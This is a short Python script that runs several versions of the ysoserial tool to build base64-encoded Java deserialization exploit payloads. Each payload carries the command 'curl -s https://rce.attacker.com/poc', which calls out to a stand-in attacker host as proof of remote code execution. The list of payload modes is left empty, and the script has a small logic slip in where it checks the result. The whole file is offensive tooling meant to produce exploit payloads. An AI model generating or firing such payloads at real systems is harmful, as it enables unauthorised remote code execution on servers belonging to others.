import os

modes = [] # All payload names here

collab = "attacker.com"
payload = f"curl -s https://rce.{collab}/poc"

for i in range(0,6):

    for mode in modes:
            result = os.popen('java -jar ysoserial' + f"{i}" + '.jar ' + mode + ' "' + payload + '" | base64 -w 0').read()

    if result != "":
            print(result)
    else:
            print("Donno but something is going wrong :/")
